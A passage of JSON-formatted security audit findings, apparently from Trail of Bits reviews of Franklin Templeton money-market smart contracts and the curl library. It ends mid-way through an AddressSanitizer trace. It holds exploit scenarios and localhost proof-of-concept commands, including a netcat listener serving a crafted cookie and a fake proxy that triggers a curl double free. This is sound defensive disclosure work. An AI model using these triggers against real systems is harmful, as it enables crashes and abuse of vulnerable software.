        "body": "An unauthorized account can keep shares if the admin deauthorizes the shareholder without zeroing their balance. This can lead to legal issues because unauthorized users can keep shares of the MMF. The deauthorizeAccount function in the AuthorizationModule contract does not check that the balance of the provided account is zero before revoking the ROLE_FUND_AUTHORIZED role: function deauthorizeAccount ( address account ) external override onlyRole(ROLE_AUTHORIZATION_ADMIN) { require (account != address ( 0 ), \"INVALID_ADDRESS\" ); address txModule = modules.getModuleAddress( keccak256 ( \"MODULE_TRANSACTIONAL\" ) ); require (txModule != address ( 0 ), \"MODULE_REQUIRED_NOT_FOUND\" ); require ( hasRole(ROLE_FUND_AUTHORIZED, account), \"SHAREHOLDER_DOES_NOT_EXISTS\" ); require ( !ITransactionStorage(txModule).hasTransactions(account), \"PENDING_TRANSACTIONS_EXIST\" ); _revokeRole(ROLE_FUND_AUTHORIZED, account); emit AccountDeauthorized(account); } Figure 4.1: The deauthorizeAccount function in the AuthorizationModule contract If an admin account deauthorizes a shareholder account without making the balance zero, the unauthorized account will keep the shares of the MMF. The impact is limited, however, because the unauthorized account will not be able to liquidate the shares. The admin can also adjust the balance of the account to make it zero. However, if the admin forgets to adjust the balance or is unable to adjust the balance, it can lead to an unauthorized account holding shares of the MMF. Recommendations Short term, add a check in the deauthorizeAccount function to ensure that the balance of the provided account is zero. Long term, document the system state machine specication and follow it to ensure proper data validation checks are added in all state-modifying functions. Add fuzz tests where the rules enforced by those validation checks are the invariants under test.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. Solidity compiler optimizations can be problematic ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-05-franklintempleton-moneymarket-securityreview.pdf",
        "body": "The MMF has enabled optional compiler optimizations in Solidity. According to a November 2018 audit of the Solidity compiler , the optional optimizations may not be safe . optimizer: { enabled: true , runs: 200 , }, Figure 5.1: Hardhat optimizer enabled in hardhat.config.js Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild use them. Therefore, it is unclear how well they are being tested and exercised. Moreover, optimizations are actively being developed . High-severity security issues due to optimization bugs have occurred in the past. A high-severity bug in the emscripten -generated solc-js compiler used by True and Remix persisted until late 2018; the x for this bug was not reported in the Solidity changelog. Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6 . More recently, another bug due to the incorrect caching of Keccak-256 was reported. It is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations. Exploit Scenario A latent or future bug in Solidity compiler optimizationsor in the Emscripten transpilation to solc-js causes a security vulnerability in the MMF contracts. Recommendations Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug. Long term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "6. Project dependencies contain vulnerabilities ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-05-franklintempleton-moneymarket-securityreview.pdf",
        "body": "Although dependency scans did not identify a direct threat to the project codebase, npm audit found dependencies with known vulnerabilities. Due to the sensitivity of the deployment code and its environment, it is important to ensure dependencies are not malicious. Problems with dependencies in the JavaScript community could have a signicant eect on the MMF system. The output detailing the identied issues has been included below: Dependency Version ID",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Unimplemented getVersion function returns default value of zero ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-05-franklintempleton-moneymarket-securityreview.pdf",
        "body": "The getVersion function within the TransferAgentModule contract is not implemented; at present, it yields the default uint8 value of zero. function getVersion() external pure virtual override returns ( uint8 ) {} Figure 7.1: Unimplemented getVersion function in the TransferAgentModule contract The other module contracts establish a pattern where the getVersion function is supposed to return a value of one. function getVersion() external pure virtual override returns ( uint8 ) { return 1; } Figure 7.2: Implemented getVersion function in the TransactionalModule contract Exploit Scenario Alice calls the getVersion function on the TransferAgentModule contract. It returns zero, and all the other module contracts return one. Alice misunderstands the system and which contracts are on what version of their lifecycle. Recommendations Short term, implement the getVersion function in the TransferAgentModule contract so it matches the specication established in the other modules. Long term, use the Slither static analyzer to catch common issues such as this one. Implement slither-action into the projects CI pipeline.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "8. The MultiSigGenVerier threshold can be passed with a single signature ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-05-franklintempleton-moneymarket-securityreview.pdf",
        "body": "A single signature can be used multiple times to pass the threshold in the MultiSigGenVerifier contract, allowing a single signer to take full control of the system. The signedDataExecution function in the MultiSigGenVerifier contract veries provided signatures and accumulates the acquiredThreshold value in a loop as shown in gure 8.1: for ( uint256 i = 0 ; i < signaturesCount; i++) { (v, r, s) = _splitSignature(signatures, i); address signerRecovered = ecrecover( hash , v, r, s); if (signersSet.contains(signerRecovered)) { acquiredThreshold += signersMap[signerRecovered]; } } Figure 8.1: The signer recovery section of the signedDataExecution function in the MultiSigGenVerifier contract This code checks whether the recovered signer address is one of the previously added signers and adds the signers weight to acquiredThreshold . However, the code does not check that all the recorded signers are unique, which allows the submitter to pass the threshold with only a single signature to execute the signed transaction. The current function has an implicit zero-address check in the subsequent if statementto add new signers, they must not be address(0) . If this logic changes in the future, the impact of the ecrecover function returning address(0) (which happens when a signature is malformed) must be carefully reviewed. Exploit Scenario Eve, a signer, colludes with a submitter to settle their transactions at a favorable date and price. Eve signs the transaction and provides it to the submitter. The submitter uses this signature to call the signedDataExecution function by repeating the same signature multiple times in the signatures argument array to pass the threshold. Using this method, Eve can execute any admin transaction without consent from other admins. Recommendations Short term, have the code verify that the signatures provided to the signedDataExecution function are unique. One way of doing this is to sort the signatures in increasing order of the signer addresses and verify this order in the loop. An example of this order verication code is shown in gure 8.2: address lastSigner = address(0); for ( uint256 i = 0 ; i < signaturesCount; i++) { (v, r, s) = _splitSignature(signatures, i); address signerRecovered = ecrecover( hash , v, r, s); require (lastSigner < signerRecovered); lastSigner = signerRecovered; if (signersSet.contains(signerRecovered)) { acquiredThreshold += signersMap[signerRecovered]; } } Figure 8.2: An example code to verify uniqueness of the provided signatures Long term, expand unit test coverage to account for common edge cases, and carefully consider all possible values for any user-provided inputs. Implement fuzz testing to explore complex scenarios and nd dicult-to-detect bugs in functions with user-provided inputs.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "9. Shareholders can renounce their authorization role ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-05-franklintempleton-moneymarket-securityreview.pdf",
        "body": "Shareholders can renounce their authorization role. As a result, system contracts that check for authorization and o-chain components may not work as expected because of an inconsistent system state. The AuthorizationModule contract extends the AccessControlUpgradeable contract from the OpenZeppelin library. The AccessControlUpgradeable contract has a public renounceRole function, which can be called by anyone to revoke a role on their own account. function renounceRole ( bytes32 role , address account ) public virtual override { require (account == _msgSender(), \"AccessControl: can only renounce roles for self\" ); _revokeRole(role, account); } Figure 9.1: The renounceRole function of the base contract from the OpenZeppelin library Any shareholder can use the renounceRole function to revoke the ROLE_FUND_AUTHORIZED role on their own account without authorization from the admin. This role is used in three functions in the AccessControlUpgradeable contract: 1. The isAccountAuthorized function to check if an account is authorized 2. The getAuthorizedAccountsCount to get the number of authorized accounts 3. The getAuthorizedAccountAt to get the authorized account at an index Other contracts and o-chain components relying on these functions may nd the system in an inconsistent state and may not be able to work as expected. Exploit Scenario Eve, an authorized shareholder, renounces her ROLE_FUND_AUTHORIZED role. The o-chain components fetch the number of authorized accounts, which is one less than the expected value. The o-chain component is now operating on an inaccurate contract state. Recommendations Short term, have the code override the renounceRole function in the AuthorizationModule contract. Make this overridden function an admin-only function. Long term, read all the library code to nd public functions exposed by the base contracts and override them to implement correct business logic and enforce proper access controls. Document any changes between the original OpenZeppelin implementation and the MMF implementation. Be sure to thoroughly test overridden functions and changes in unit tests and fuzz tests.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "10. Risk of multiple dividend payouts in a day ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-05-franklintempleton-moneymarket-securityreview.pdf",
        "body": "The fund manager can lose the systems money by making multiple dividend payouts in a day when they should be paid out only once a day. The distributeDividends function in the MoneyMarketFund contract takes the date as an argument. This date value is not validated to be later than the date from an earlier execution of the distributeDividends function. function distributeDividends ( address [] calldata accounts, uint256 date , int256 rate , uint256 price ) { } external onlyAdmin onlyWithValidRate(rate) onlyValidPaginationSize(accounts.length, MAX_ACCOUNT_PAGE_SIZE) lastKnownPrice = price; for ( uint i = 0 ; i < accounts.length; ) { _processDividends(accounts[i], date, rate, price); unchecked { i++; } } Figure 10.1: The distributeDividends function in the MoneyMarketFund contract As a result, the admin can distribute dividends multiple times a day, which will result in the loss of funds from the company to the users. The admin can correct this mistake by using the adjustBalance function, but adjusting the balance for all the system users will be a dicult and costly process. The same issue also aects the following three functions: 1. The endOfDay function in the MoneyMarketFund contract 2. The distributeDividends function in the TransferAgentModule contract 3. The endOfDay function in the TransferAgentModule contract. Exploit Scenario The admin sends a transaction to distribute dividends. The transaction is not included in the blockchain because of congestion or gas estimation errors. Forgetting about the earlier transaction, the admin sends another transaction, and both transactions are executed to distribute dividends on the same day. Recommendations Short term, have the code store the last dividend distribution date and validate that the date argument in all the dividend distribution functions is later than the last stored dividend date. Long term, document the system state machine specication and follow it to ensure proper data validation checks are added to all state-modifying functions.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "11. Shareholders can stop admin from deauthorizing them ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-05-franklintempleton-moneymarket-securityreview.pdf",
        "body": "Shareholders can prevent the admin from deauthorizing them by front-running the deauthorizeAccount function in the AuthorizationModule contract. The deauthorizeAccount function reverts if the provided account has one or more pending transactions. function deauthorizeAccount ( address account ) external override onlyRole(ROLE_AUTHORIZATION_ADMIN) { require (account != address ( 0 ), \"INVALID_ADDRESS\" ); address txModule = modules.getModuleAddress( keccak256 ( \"MODULE_TRANSACTIONAL\" ) ); require (txModule != address ( 0 ), \"MODULE_REQUIRED_NOT_FOUND\" ); require ( hasRole(ROLE_FUND_AUTHORIZED, account), \"SHAREHOLDER_DOES_NOT_EXISTS\" ); require ( !ITransactionStorage(txModule).hasTransactions(account), \"PENDING_TRANSACTIONS_EXIST\" ); _revokeRole(ROLE_FUND_AUTHORIZED, account); emit AccountDeauthorized(account); } Figure 11.1: The deauthorizeAccount function in the AuthorizationModule contract A shareholder can front-run a transaction executing the deauthorizeAccount function for their account by submitting a new transaction request to buy or sell shares. The deauthorizeAccount transaction will revert because of a pending transaction for the shareholder. Exploit Scenario Eve, a shareholder, sets up a bot to front-run all deauthorizeAccount transactions that add a new transaction request for her. As a result, all admin transactions to deauthorize Eve fail. Recommendations Short term, remove the check for the pending transactions of the provided account and consider one of the following: 1. Have the code cancel the pending transactions of the provided account in the deauthorizeAccount function. 2. Add a check in the _processSettlements function in the MoneyMarketFund contract to skip unauthorized accounts. Add the same check in the _processSettlements function in the TransferAgentModule contract. Long term, always analyze all contract functions that can be aected by attackers front-running calls to manipulate the system.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "12. Total number of submitters in MultiSigGenVerier contract can be more than allowed limit of MAX_SUBMITTERS ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-05-franklintempleton-moneymarket-securityreview.pdf",
        "body": "The total number of submitters in the MultiSigGenVerifier contract can be more than the allowed limit of MAX_SUBMITTERS . The addSubmitters function in the MultiSigGenVerifier contract does not check that the total number of submitters in the submittersSet is less than the value of the MAX_SUBMITTERS constant. function addSubmitters ( address [] calldata submitters) public onlyVerifier { require (submitters.length <= MAX_SUBMITTERS, \"INVALID_ARRAY_LENGTH\" ); for ( uint256 i = 0 ; i < submitters.length; i++) { submittersSet.add(submitters[i]); } } Figure 12.1: The addSubmitters function in the MultiSigGenVerifier contract This allows the admin to add more than the maximum number of allowed submitters to the MultiSigGenVerifier contract. Recommendations Short term, add a check to the addSubmitters function to verify that the length of the submittersSet is less than or equal to the MAX_SUBMITTERS constant. Long term, document the system state machine specication and follow it to ensure proper data validation checks are added in all state-modifying functions. To ensure MAX_SUBMITTERS is never exceeded, add fuzz testing where MAX_SUBMITTERS is the system invariant under test.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "13. Lack of contract existence check on target address ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-05-franklintempleton-moneymarket-securityreview.pdf",
        "body": "The signedDataExecution function lacks validation to ensure that the target argument is a contract address and not an externally owned account (EOA). The absence of such a check could lead to potential security issues, particularly when executing low-level calls to an address not containing contract code. Low-level calls to an EOA return true for the success variable instead of reverting as they would with a contract address. This unexpected behavior could trigger inadvertent execution of subsequent code relying on the success variable to be accurate, potentially resulting in undesired outcomes. The onlySubmitter modier limits the potential impact of this vulnerability. function signedDataExecution( address target, bytes calldata payload, bytes calldata signatures ) external onlySubmitter { ... // Wallet logic if (acquiredThreshold >= _getRequiredThreshold(target)) { (bool success, bytes memory result) = target.call{value: 0}( payload ); emit TransactionExecuted(target, result); if (!success) { assembly { result := add(result, 0x04) } revert(abi.decode(result, (string))); } } else { revert(\"INSUFICIENT_THRESHOLD_ACQUIRED\"); } } Figure 13.1: The signedDataExecution function in the MultiSigGenVerifier contract Exploit Scenario Alice, an authorized submitter account, calls the signedDataExecution function, passing in an EOA address instead of the expected contract address. The low-level call to the target address returns successfully and does not revert. As a result, Alice thinks she has executed code but in fact has not. Recommendations Short term, integrate a contract existence check to ensure that code is present at the address passed in as the target argument. Long term, use the Slither static analyzer to catch issues such as this one. Consider integrating slither-action into the projects CI pipeline.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "14. Pending transactions can trigger a DoS ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-05-franklintempleton-moneymarket-securityreview.pdf",
        "body": "An unbounded number of pending transactions can cause the _processSettlements function to run out of gas while trying to process them. There is no restriction on the length of pending transactions a user might have, and gas-intensive operations are performed in the for-loop of the _processSettlements function. If an account returns too many pending transactions, operations that call _processSettlements might revert with an out-of-gas error. function _processSettlements( address account, uint256 date, uint256 price ) internal whenTransactionsExist(account) { bytes32 [] memory pendingTxs = ITransactionStorage( moduleRegistry.getModuleAddress(TRANSACTIONAL_MODULE) ).getAccountTransactions(account); for ( uint256 i = 0; i < pendingTxs.length; ) { ... Figure 14.1: The pendingTxs loop in the _processSettlements function in the MoneyMarketFund contract The same issue aects the _processSettlements function in the TransferAgentModule contract. Exploit Scenario Eve submits multiple transactions to the requestSelfServiceCashPurchase function, and each creates a pending transaction record in the pendingTransactionsMap for Eves account. When settleTransactions is called with an array of accounts that includes Eve, the _processSettlements function tries to process all her pending transactions and runs out of gas in the attempt. Recommendations Short term, make the following changes to the transaction settlement ow: 1. Enhance the o-chain component of the system to identify accounts with too many pending transactions and exclude them from calls to _processSettlements ows. 2. Create another transaction settlement function that paginates over the list of pending transactions of a single account. Long term, implement thorough testing protocols for these loop structures, simulating various scenarios and edge cases that could potentially result in unbounded inputs. Ensure that all loop structures are robustly designed with safeguards in place, such as constraints and checks on input variables.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "15. Dividend distribution has an incorrect rounding direction for negative rates ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-05-franklintempleton-moneymarket-securityreview.pdf",
        "body": "The rounding direction of the dividend calculation in the _processDividends function benets the user when the dividend rate is negative, causing the fund to lose value it should retain. The division operation that computes dividend shares is rounding down in the _processDividends function of the MoneyMarketFund contract: function _processDividends ( address account , uint256 date , int256 rate , uint256 price ) internal whenHasHoldings(account) { uint256 dividendAmount = balanceOf(account) * uint256 (abs(rate)); uint256 dividendShares = dividendAmount / price; _payDividend(account, rate, dividendShares); // handle very unlikely scenario if occurs _handleNegativeYield(account, rate, dividendShares); _removeEmptyAccountFromHoldingsSet(account); emit DividendDistributed(account, date, rate, price, dividendShares); } Figure 15.1: The _processDividends function in the MoneyMarketFund contract As a result, for a negative dividend rate, the rounding benets the user by subtracting a lower number of shares from the user balance. In particular, if the rate is low and the price is high, the dividend can round down to zero. The same issue aects the _processDividends function in the TransferAgentModule contract. Exploit Scenario Eve buys a small number of shares from multiple accounts. The dividend rounds down and is equal to zero. As a result, Eve avoids the losses from the downside movement of the fund while enjoying prots from the upside. Recommendations Short term, have the _processDividends function round up the number of dividendShares for negative dividend rates. Long term, document the expected rounding direction for every arithmetic operation (see appendix G ) and follow it to ensure that rounding is always benecial to the fund. Use Echidna to nd issues arising from the wrong rounding direction.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "1. Bad recommendation in libcurl cookie documentation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-curl-securityreview.pdf",
        "body": "The libcurl documentation recommends that, to enable the cookie store with a blank cookie database, the calling application should use the CURLOPT_COOKIEFILE option with a non-existing le name or plain  , as shown in gure 1.1. However, the former recommendationa non-blank lename with a target that does not existcan have unexpected results if a le by that name is unexpectedly present. Figure 1.1: The recommendation in libcurls documentation Exploit Scenario An inexperienced developer uses libcurl in his application, invoking the CURLOPT_COOKIEFILE option and hard-coding a lename that he thinks will never exist (e.g., a long random string), but which could potentially be created on the lesystem. An attacker reverse-engineers his program to determine the lename and path in question, and then uses a separate local le write vulnerability to inject cookies into the application. Recommendations Short term, remove the reference to a non-existing le name; mention only a blank string. Long term, avoid suggesting tricks such as this in documentation when a misuse or misunderstanding of them could result in side eects of which users may be unaware.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Libcurl URI parser accepts invalid characters ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-curl-securityreview.pdf",
        "body": "According to RFC 3986 section 2.2, Reserved Characters, reserved = gen-delims / sub-delims gen-delims = \":\" / \"/\" / \"?\" / \"#\" / \"[\" / \"]\" / \"@\" sub-delims = \"!\" / \"$\" / \"&\" / \"'\" / \"(\" / \")\" / \"*\" / \"+\" / \",\" / \";\" / \"=\" Figure 2.1: Reserved characters for URIs. Furthermore, the host eld of the URI is dened as follows: host = IP-literal / IPv4address / reg-name reg-name = *( unreserved / pct-encoded / sub-delims ) ... unreserved = ALPHA / DIGIT / \"-\" / \".\" / \"_\" / \"~\" sub-delims = \"!\" / \"$\" / \"&\" / \"'\" / \"(\" / \")\" / \"*\" / \"+\" / \",\" / \";\" / \"=\" Figure 2.2: Valid characters for the URI host eld However, cURL does not seem to strictly adhere to this format, as it accepts characters not included in the above. This behavior is present in both libcurl and the cURL binary. For instance, characters from the gen-delims set, and those not in the reg-name set, are accepted: $ curl -g \"http://foo[]bar\" # from gen-delims curl: (6) Could not resolve host: foo[]bar $ curl -g \"http://foo{}bar\" # outside of reg-name curl: (6) Could not resolve host: foo{}bar Figure 2.3: Valid characters for the URI host eld The exploitability and impact of this issue is not yet well understood; this may be deliberate behavior to account for currently unknown edge-cases or legacy support. Recommendations Short term, determine whether these characters are being allowed for compatibility reasons. If so, it is likely that nothing can be done; if not, however, make the URI parser stricter, rejecting characters that cannot appear in a valid URI as dened by RFC 3986. Long term, add fuzz tests for the URI parser that use forbidden or out-of-scope characters.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Low"
        ]
    },
    {
        "title": "3. libcurl Alt-Svc parser accepts invalid port numbers ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-curl-securityreview.pdf",
        "body": "Invalid port numbers in Alt-Svc headers, such as negative numbers, may be accepted by libcurl when presented by an HTTP server. libcurl uses the strtoul function to parse port numbers in Alt-Svc headers. This function will accept and parse negative numbers and represent them as unsigned integers without indicating an error. For example, when an HTTP server provides an invalid port number of -18446744073709543616, cURL parses the number as 8000: * Using HTTP2, server supports multiplexing * Connection state changed (HTTP/2 confirmed) * Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0 * Using Stream ID: 1 (easy handle 0x12d013600) > GET / HTTP/2 > Host: localhost:2443 > user-agent: curl/7.79.1 > accept: */* > < HTTP/2 200 < server: basic-h2-server/1.0 < content-length: 130 < content-type: application/json * Added alt-svc: localhost: 8000 over h3 < alt-svc: h3=\": -18446744073709543616 \" < Figure 3.1: Example cURL session Exploit Scenario A server operator wishes to target cURL clients and serve them alternative content. The operator includes a specially-crafted, invalid Alt-Svc header on the HTTP server responses, indicating that HTTP/3 is available on port -18446744073709543616 , an invalid, negative port number. When users connect to the HTTP server using standards-compliant HTTP client software, their clients ignore the invalid header. However, when users connect using cURL, it interprets the negative number as an unsigned integer and uses the resulting port number, 8000 , to upgrade the next connection to HTTP/3. The server operator hosts alternative content on this other port. Recommendations Short term, improve parsing and validation of Alt-Svc headers so that invalid port values are rejected. Long term, add fuzz and dierential tests to the Alt-Svc parsing code to detect non-standard behavior.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Low"
        ]
    },
    {
        "title": "4. Non-constant-time comparison of secrets ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-curl-securityreview.pdf",
        "body": "Several cases were discovered in which possibly user-supplied values are checked against a known secret using non-constant-time comparison. In cases where an attacker can accurately time how long it takes for the application to fail validation of submitted data that he controls, such behavior could leak information about the secret itself, allowing the attacker to brute-force it in linear time. In the example below, credentials are checked via Curl_safecmp() , which is a memory-safe, but not constant-time, wrapper around strcmp() . This is used to determine whether or not to reuse an existing TLS connection. #ifdef USE_TLS_SRP Curl_safecmp(data->username, needle->username) && Curl_safecmp(data->password, needle->password) && (data->authtype == needle->authtype) && #endif Figure 4.1: lib/url.c , lines 148 through 152. Credentials checked using a memory-safe, but not constant-time, wrapper around strcmp() The above is one example out of several cases found, all of which are noted above. Exploit Scenario An application uses a libcurl build with TLS-SRP enabled and allows multiple users to make TLS connections to a remote server. An attacker times how quickly cURL responds to his requests to create a connection, and thereby gradually works out the credentials associated with an existing connection. Eventually, he is able to submit a request with exactly the same SSL conguration such that another users existing connection is reused. Recommendations Short term, introduce a method, e.g. Curl_constcmp() , which does a constant-time comparison of two stringsthat is, it scans both strings exactly once in their entirety. Long term, compare secrets to user-submitted values using only constant-time algorithms.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. Tab injection in cookie le ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-curl-securityreview.pdf",
        "body": "When libcurl makes an HTTP request, the cookie jar le is overwritten to store the cookies, but the storage format uses tabs to separate key pieces of information. The cookie parsing code for HTTP headers strips the leading and trailing tabs from cookie keys and values, but it does not reject cookies with tabs inside the keys or values. In the snippet of lib/cookie.c below, Curl_cookie_add() parses tab-separated cookie data via strtok_r() and uses a switch-based state machine to interpret specic parts as key information: firstptr = strtok_r(lineptr, \"\\t\" , &tok_buf); /* tokenize it on the TAB */ Figure 5.1: Parsing tab-separated cookie data via strtok_r() Exploit Scenario A webpage returns a Set-Cookie header with a tab character in the cookie name. When a cookie le is saved from cURL for this page, the part of the name before the tab is taken as the key, and the part after the tab is taken as the value. The next time the cookie le is loaded, these two values will be used. % echo \"HTTP/1.1 200 OK\\r\\nSet-Cookie: foo\\tbar=\\r\\n\\r\\n\\r\\n\"|nc -l 8000 & % curl -v -c /tmp/cookies.txt http://localhost:8000 * Trying 127.0.0.1:8000... * Connected to localhost (127.0.0.1) port 8000 (#0) > GET / HTTP/1.1 > Host: localhost:8000 > User-Agent: curl/7.79.1 > Accept: */* * Mark bundle as not supporting multiuse < HTTP/1.1 200 OK * Added cookie foo bar=\"\" for domain localhost, path /, expire 0 < Set-Cookie: foo bar= * no chunk, no close, no size. Assume close to signal end Figure 5.2: Sending a cookie with name foo\\tbar , and no value. % cat /tmp/cookies.txt | tail - localhost FALSE / FALSE 0 foo bar Figure 5.3: Sending a cookie with name foo\\tbar and no value Recommendations Short term, either reject any cookie with a tab in its key (as \\t is not a valid character for cookie keys, according to the relevant RFC), or escape or quote tab characters that appear in cookie keys. Long term, do not assume that external data will follow the intended specication. Always account for the presence of special characters in such inputs.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. Standard output/input/error may not be opened ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-curl-securityreview.pdf",
        "body": "The function main_checkfds() is used to ensure that le descriptors 0, 1, and 2 (stdin, stdout, and stderr) are open before curl starts to run. This is necessary to avoid the case wherein, if one of those descriptors fails to open initially, the next network socket opened by cURL may gain an FD number of 0, 1, or 2, resulting in what should be local input/output being received from or sent to a network socket instead. However, pipe errors actually result in the same outcome as success: static void main_checkfds ( void ) { #ifdef HAVE_PIPE int fd[ 2 ] = { STDIN_FILENO, STDIN_FILENO }; while (fd[ 0 ] == STDIN_FILENO || fd[ 0 ] == STDOUT_FILENO || fd[ 0 ] == STDERR_FILENO || fd[ 1 ] == STDIN_FILENO || fd[ 1 ] == STDOUT_FILENO || fd[ 1 ] == STDERR_FILENO) if (pipe(fd) < 0 ) return ; /* Out of handles. This isn't really a big problem now, but will be when we try to create a socket later. */ close(fd[ 0 ]); close(fd[ 1 ]); #endif } Figure 6.1: tool_main.c:83105 , lines 83 through 105 Though the comment notes that an out-of-handles condition would result in a failure later on in the application, there may be cases where this is not truee.g., the maximum number of handles has been reached at the time of this check, but handles are closed between it and the next attempt to create a socket. In such a case, execution might continue as normal, with stdin/out/err being redirected to an unexpected location. Recommendations Short term, use fcntl() to check if stdin/out/err are open. If they are not, exit the program if the pipe function fails. Long term, do not assume that execution will fail later; fail early in cases like these.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Double free when using HTTP proxy with specic protocols ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-curl-securityreview.pdf",
        "body": "Using cURL with proxy connection and dict, gopher, LDAP, or telnet protocol triggers a double free vulnerability (gure 7.1). The connect_init function allocates a memory block for a connectdata struct (gure 7.2). After the connection, cURL frees the allocated buer in the conn_free function (gure 7.3), which is freed for the second time in the Curl_free_request_state frees, which uses the Curl_safefree function on elements of the Curl_easy struct (gure 7.4). This double free was also not detected in release builds during our testing  the glibc allocator checks may fail to detect such cases on some occasions. The two frees success indicates that future memory allocations made by the program will return the same pointer twice. This may enable exploitation of cURL if the allocated objects contain data controlled by an attacker. Additionally, if this vulnerability also triggers in libcurlwhich we believe it shouldit may enable the exploitation of programs that depend on libcurl. $ nc -l 1337 | echo 'test' & # Imitation of a proxy server using netcat $ curl -x http://test:test@127.0.0.1:1337 dict://127.0.0.1 2069694==ERROR: AddressSanitizer: attempting double-free on 0x617000000780 in thread T0: #0 0x494c8d in free (curl/src/.libs/curl+0x494c8d) #1 0x7f1eeeaf3afe in Curl_free_request_state curl/lib/url.c:2259:3 #2 0x7f1eeeaf3afe in Curl_close curl/lib/url.c:421:3 #3 0x7f1eeea30943 in curl_easy_cleanup curl/lib/easy.c:798:3 #4 0x4e07df in post_per_transfer curl/src/tool_operate.c:656:3 #5 0x4dee58 in serial_transfers curl/src/tool_operate.c:2434:18 #6 0x4dee58 in run_all_transfers curl/src/tool_operate.c:2620:16 #7 0x4dee58 in operate curl/src/tool_operate.c:2732:18 #8 0x4dcf73 in main curl/src/tool_main.c:276:14 #9 0x7f1eee2af082 in __libc_start_main /build/glibc-SzIz7B/glibc-2.31/csu/../csu/libc-start.c:308:16 #10 0x41c7cd in _start (curl/src/.libs/curl+0x41c7cd) 0x617000000780 is located 0 bytes inside of 664-byte region [0x617000000780,0x617000000a18) freed by thread T0 here: #0 0x494c8d in free (curl/src/.libs/curl+0x494c8d) #1 0x7f1eeeaf6094 in conn_free curl/lib/url.c:814:3 #2 0x7f1eeea92cc6 in curl_multi_perform curl/lib/multi.c:2684: #3 0x7f1eeea304bd in easy_transfer curl/lib/easy.c:662:15 #4 0x7f1eeea304bd in easy_perform curl/lib/easy.c:752:42 #5 0x7f1eeea304bd in curl_easy_perform curl/lib/easy.c:771:10 #6 0x4dee35 in serial_transfers curl/src/tool_operate.c:2432:16 #7 0x4dee35 in run_all_transfers curl/src/tool_operate.c:2620:16 #8 0x4dee35 in operate curl/src/tool_operate.c:2732:18 #9 0x4dcf73 in main curl/src/tool_main.c:276:14 #10 0x7f1eee2af082 in __libc_start_main /build/glibc-SzIz7B/glibc-2.31/csu/../csu/libc-start.c:308:16 previously allocated by thread T0 here: #0 0x495082 in calloc (curl/src/.libs/curl+0x495082) #1 0x7f1eeea6d642 in connect_init curl/lib/http_proxy.c:174:9 #2 0x7f1eeea6d642 in Curl_proxyCONNECT curl/lib/http_proxy.c:1061:14 #3 0x7f1eeea6d1f2 in Curl_proxy_connect curl/lib/http_proxy.c:118:14 #4 0x7f1eeea94c33 in multi_runsingle curl/lib/multi.c:2028:16 #5 0x7f1eeea92cc6 in curl_multi_perform curl/lib/multi.c:2684:14 #6 0x7f1eeea304bd in easy_transfer curl/lib/easy.c:662:15 #7 0x7f1eeea304bd in easy_perform curl/lib/easy.c:752:42 #8 0x7f1eeea304bd in curl_easy_perform curl/lib/easy.c:771:10 #9 0x4dee35 in serial_transfers curl/src/tool_operate.c:2432:16 #10 0x4dee35 in run_all_transfers 